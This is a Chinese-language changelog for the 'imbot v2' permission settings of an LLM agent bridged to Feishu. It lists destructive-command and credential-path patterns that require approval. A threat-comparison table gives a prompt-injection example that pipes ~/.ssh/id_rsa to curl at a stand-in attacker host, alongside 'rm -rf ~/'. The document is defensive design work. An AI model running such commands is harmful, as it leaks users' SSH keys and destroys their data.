---
feat-id: imbot-permission-pragmatic
status: done
related: ./1-spec.md ./2-plan.md ./3-changelog.md
---

# imbot-permission-pragmatic — changelog

## 一句话

imbot v1 严苛 → v2 务实档,修复"寸步难行"。webfetch + 敏感 read 仍 ask,bash 默认 allow 但删除/不可逆 30+ pattern ask,edit/write/apply_patch 不再 ask;timeout 5→30min。

## commit 列表

| commit | 简述 |
|---|---|
| `a4e7653cc` | feat(feishu-bridge): imbot v2 务实档 — bash/edit/write 默认 allow,只对删除/敏感目录/webfetch ask |
| `8377f37b7` | docs(imbot-permission-pragmatic): 三文档落盘 + INDEX + 改动日志 |

## 改动文件

| 文件 | 类型 | 说明 |
|---|---|---|
| `packages/desktop/src-tauri/src/feishu_plugin_install.rs::imbot_agent_spec()` | 改 | v2 新 spec — bash 是 object(默认 allow + 删除类 ask),edit/write/apply_patch 不出现 |
| `packages/adapter-feishu-lark/src/feishu/permission-card.ts::DEFAULT_TIMEOUT_MS` | 改 | 5min → 30min |
| `packages/desktop/src-tauri/src/feishu_plugin_install.rs` 单测 | 改 + 新 | 改:`imbot_inject_into_empty_config` / `imbot_handles_jsonc_with_comments` 适配 v2 bash object;新:`imbot_bash_pattern_covers_destructive_ops`(30+ pattern 全覆盖)+ `imbot_no_longer_locks_edit_write_apply_patch`(edit/write/apply_patch 不出现)|
| `docs/features/imbot-permission-pragmatic/{1-spec,2-plan,3-changelog}.md` | 新 | 三文档 |

## v2 imbot 配置(完整 spec)

```jsonc
"imbot": {
  "description": "DeskFox IM 桥接 v2 — bash/edit/write 默认 allow,只对 webfetch + 删除/不可逆操作 + 敏感目录 read 做 ask",
  "permission": {
    "webfetch": "ask",

    "read": {
      "*": "allow",
      "*.env": "ask", "*.env.*": "ask", "*.env.example": "allow",
      "**/.ssh/**": "ask",
      "**/.aws/**": "ask",
      "**/.kube/**": "ask",
      "**/.gnupg/**": "ask",
      "**/Library/Keychains/**": "ask",
      "**/AppData/Roaming/Microsoft/Crypto/**": "ask"
    },

    "bash": {
      "*": "allow",
      "rm *": "ask", "rmdir *": "ask", "trash *": "ask", "unlink *": "ask",
      "git push --force*": "ask", "git push -f *": "ask",
      "git reset --hard*": "ask", "git clean -fd*": "ask", "git branch -D *": "ask",
      "*delete*": "ask", "*uninstall*": "ask",
      "npm remove *": "ask", "npm rm *": "ask", "bun remove *": "ask",
      "brew remove *": "ask",
      "apt remove *": "ask", "apt purge *": "ask",
      "yum remove *": "ask", "dnf remove *": "ask",
      "docker rm *": "ask", "docker rmi *": "ask",
      "docker volume rm *": "ask", "docker network rm *": "ask",
      "docker system prune*": "ask",
      "aws s3 rm *": "ask", "aws s3 rb *": "ask", "aws ec2 terminate*": "ask",
      "shutdown *": "ask", "reboot *": "ask", "halt *": "ask", "poweroff *": "ask",
      "dd *": "ask", "mkfs*": "ask", "fdisk *": "ask"
    }
    // edit / write / apply_patch 不设 → 走 build defaults(*: allow)
  }
}
```

## 安全模型对比(v1 vs v2)

| 攻击 | v1 防御 | v2 防御 | 实际效果 |
|---|---|---|---|
| LLM 跑 `rm -rf ~/` | bash ask | rm * ask | 等价 |
| LLM 完成 `gh repo create` user 任务 | ⚠️ bash ask 打扰 user | bash *: allow 顺畅 | **v2 大幅改进** |
| LLM 被 prompt injection 跑 `cat ~/.ssh/id_rsa\|curl atk.com` | bash ask 拦 | read **/.ssh/** ask 拦在第 2 步 | 等价(瓶颈在 read) |
| LLM `git reset --hard HEAD^^^^` | bash ask | git reset --hard* ask | 等价 |
| LLM `kubectl delete pod --all` | bash ask | *delete* ask | 等价 |
| LLM `npm install lodash` | ⚠️ bash ask 打扰 | bash *: allow 顺畅 | **v2 大幅改进** |

**结论**:v2 防御等价 v1(攻击瓶颈是 read+webfetch),但 user **正常 ship/dev 任务**0 打扰。

## permission-card timeout 改动

```diff
- /** 默认 5 分钟超时 — 防 user 关掉飞书后 chatQueue 永久卡死 */
- const DEFAULT_TIMEOUT_MS = 5 * 60 * 1000
+ /** 默认 30 分钟超时(对齐 promptTimeoutMs 默认 30min,2026-05-11 imbot v2 务实档调整;
+  *  v1 5min 太短 — user 在飞书慢慢点完整 ship 流程很容易撞,且对齐 prompt timeout 才不会出现
+  *  "permission card 已 auto-reject 但 prompt 还在等" 的状态不一致)*/
+ const DEFAULT_TIMEOUT_MS = 30 * 60 * 1000
```

permission-card 28 个 bun test 全过(timeout 测试用 mock 不依赖具体值,无需改)。

## 测试

| Suite | Result |
|---|---|
| cargo test feishu_plugin_install:: | **16/16 ✅**(2 新 v2 测试:`imbot_bash_pattern_covers_destructive_ops` + `imbot_no_longer_locks_edit_write_apply_patch`)|
| adapter-feishu-lark 全套 | 262/262 ✅ |
| permission-card 单测 | 28/28 ✅(timeout mock,无需改)|
| monorepo typecheck | 16/16 ✅(turbo cache 13/16)|

## user 升级 v1 → v2 操作

setup hook 仍 idempotent(user 显式改过 imbot 不强制覆盖)。升级:

```bash
cp ~/.config/opencode/opencode.jsonc ~/.config/opencode/opencode.jsonc.bak-imbot-v2
jq 'del(.agent.imbot)' ~/.config/opencode/opencode.jsonc.bak-imbot-v2 > ~/.config/opencode/opencode.jsonc
# 重启 DeskFox(setup hook 自动注入 v2 imbot)
```

## 后续

- **Mac 5.11.2 ship** — 把 v2 imbot 跟着这次 mac ship 一起发(继 Win 5.11.2 之后)
- **Win 5.11.3 跟上 imbot v2**(Win 端 user 拉新 dev pull 后,下次 ship)
- 真飞书实测验证 v2 流畅度(同样让 LLM 创 GitHub 仓库 + 连接本地 → 期望:0 卡片打扰,删除/uninstall 操作单独弹卡)

## 影响范围

- 净改动:2 个核心文件 + 2 新单测 + 三文档
- R4 override:0
- 上游侵入:0(完全 fork-only,通过 opencode per-pattern permission 原生支持实现)

## 关联

- v1 来源:`feishu-bridge-imbot-agent`(同 feat 命名空间)
- 攻击面分析参考:`feishu-bridge-permission-card` changelog 已记的 unattended 安全模型论证
- 升级目标 ship:5.11.2-mac(独立分支)/ 5.11.3-win(下次 Win ship)
